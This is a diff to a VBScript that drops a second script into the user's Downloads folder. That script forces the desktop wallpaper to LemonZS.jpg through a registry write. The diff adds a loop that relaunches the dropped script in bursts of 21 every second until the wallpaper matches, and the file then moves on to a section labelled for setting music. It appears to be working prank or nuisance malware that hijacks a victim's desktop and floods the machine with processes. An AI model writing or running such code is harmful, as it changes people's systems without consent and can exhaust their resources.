@@ -34,6 +34,7 @@ lines = Array( _
     "Dim strUsername : strUsername = wshNetwork.UserName", _
     "strLocalPath = ""C:\Users\" & strUsername & "\Downloads\LemonZS.jpg""", _
     "objShell.RegWrite ""HKCU\Control Panel\Desktop\Wallpaper"", strLocalPath", _
+    "WScript.Sleep 10000", _
     "objShell.Run ""%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"", 1, True" _
 )
 Set objFile = objFSO.CreateTextFile(strFile, True)
@@ -43,17 +44,42 @@ Next
 objFile.Close
 Set objFSO = Nothing
 'Set image
+WScript.Sleep 2000
 Dim objShell
 Set objShell = CreateObject("WScript.Shell")
 strProfileFolder = objShell.ExpandEnvironmentStrings("%UserProfile%")
 strPath = strProfileFolder & "\Downloads\LemonZS.vbs"
-objShell.Run strPath
-WScript.Sleep 1000
-objShell.Run strPath
-WScript.Sleep 1000
-objShell.Run strPath
-WScript.Sleep 1000
-objShell.Run strPath
+Set objNetwork = CreateObject("WScript.Network")
+strUsername = objNetwork.UserName
+Do
+    strDesktopWallpaper = objShell.RegRead("HKCU\Control Panel\Desktop\Wallpaper")
+    If StrComp(strDesktopWallpaper, "C:\Users\" & strUsername & "\Downloads\LemonZS.jpg", vbTextCompare) = 0 Then
+        Exit Do
+    End If
+    WScript.Sleep 1000
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+    objShell.Run strPath
+Loop
+'WScript.Echo "Desktop wallpaper matches: C:\Users\" & strUsername & "\Downloads\LemonZS.jpg"
 Set objShell = Nothing
 'Set music
 Set objShell = CreateObject("WScript.Shell")
